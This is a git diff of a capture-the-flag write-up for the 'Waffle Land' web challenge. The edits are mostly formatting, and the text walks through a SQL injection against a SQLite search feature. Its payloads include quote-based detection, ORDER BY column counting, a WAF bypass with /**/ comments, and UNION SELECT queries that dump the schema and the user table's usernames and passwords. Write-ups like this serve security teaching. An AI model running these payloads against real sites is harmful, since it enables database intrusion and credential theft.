@@ -7,7 +7,7 @@ tags: ['Web']
 
 We got hacked, but our waffles are now safe after we mitigated the vulnerability.
 
-Connect here:
+Connect here:<br/>
 [http://jh2i.com:50024](http://jh2i.com:50024)
 
 ## Solution
@@ -15,12 +15,12 @@ Connect here:
 * Checking for SQL Injection (SQLi) in both, we find that the `Search` functionality is vulnerable to SQLi
 * SQLi can be detected by entering input as `'`<br/>
 
-**Payload**</br>
+**Payload**
 ```
 '
 ```
 
-**Response**</br>
+**Response**
 ```
 Bad Request
 (sqlite3.OperationalError) unrecognized token: "'"
@@ -31,21 +31,21 @@ Bad Request
 * It can be seen that `sqlite` is used as database
 * All we have to do is inject and obtain data<br/>
 
-**SQL Injection Exploitation Steps**</br>
-1. Detect vulnerability :
+**SQL Injection Exploitation Steps**
+* Detect vulnerability :
 	* already done
-2. Find type of injection :
+* Find type of injection :
 	* we know the response is gotten back
-3. Find number of columns returned :
-	1. Use `ORDER BY <column-number>`
-	2. `--;` is used to end the SQL statement<br/>
+* Find number of columns returned :
+	* Use `ORDER BY <column-number>`
+	* `--;` is used to end the SQL statement<br/>
 
-**Payload**</br>
+**Payload**
 ```
 ' ORDER BY 10 --;
 ````
 
-**Response**</br>
+**Response**
 ```
 Bad Request
 (sqlite3.OperationalError) 1st ORDER BY term out of range - should be between 1 and 5
@@ -53,32 +53,32 @@ Bad Request
 (Background on this error at: http://sqlalche.me/e/13/e3q8)
 ```
 
-4. Find the injectable columns :
-	1. Use `UNION SELECT 1,2,3,4,..,x`
-	2. In this case, we get `403 Forbidden`
-	3. Probably there is a WAF (Web Application Firewall) checking inputs, this needs to be bypassed
-	4. Using SQL comments found [here](https://incogbyte.github.io/sqli_waf_bypass/), we can bypass the WAF
-	5. From the response image below, we see that `columns 2, 3, 4` are injectable
+* Find the injectable columns :
+	* Use `UNION SELECT 1,2,3,4,..,x`
+	* In this case, we get `403 Forbidden`
+	* Probably there is a WAF (Web Application Firewall) checking inputs, this needs to be bypassed
+	* Using SQL comments found [here](https://incogbyte.github.io/sqli_waf_bypass/), we can bypass the WAF
+	* From the response image below, we see that `columns 2, 3, 4` are injectable
 
-**Payload**</br>
+**Payload**
 ```
 '/**/UNION/**/SELECT/**/1,2,3,4,5 --;
 ````
 
-**Response**</br>
+**Response**
 ![alt-text]({{site.baseurl}}/assets/Waffle-Land/vuln-cols.png)
 
-5. Exploit the columns to extract data :
-	1. Use `sql FROM sqlite_master` to get the `TABLE definitions`
-	2. We get two TABLES - `product` and `user`
-	3. `TABLE user` is what we are interested in<br/>
+* Exploit the columns to extract data :
+	* Use `sql FROM sqlite_master` to get the `TABLE definitions`
+	* We get two TABLES - `product` and `user`
+	* `TABLE user` is what we are interested in<br/>
 
-**Payload**</br>
+**Payload**
 ```
 '/**/UNION/**/SELECT/**/1,sql,3,4,5 FROM sqlite_master --;
 ```
 
-**Response**</br>
+**Response**
 ```
 CREATE TABLE product (
 	id INTEGER NOT NULL, 
@@ -99,15 +99,15 @@ CREATE TABLE user (
 )
 ```
 
-6. Extract data from TABLE :
-	1. Use `<column-names> FROM <table-names>`<br/>
+* Extract data from TABLE :
+	* Use `<column-names> FROM <table-names>`<br/>
 	
-**Payload**</br>
+**Payload**
 ```
 '/**/UNION/**/SELECT/**/1,username,password,4,5 FROM user --;
 ```
 
-**Response**</br>
+**Response**
 ```
 admin
 $4
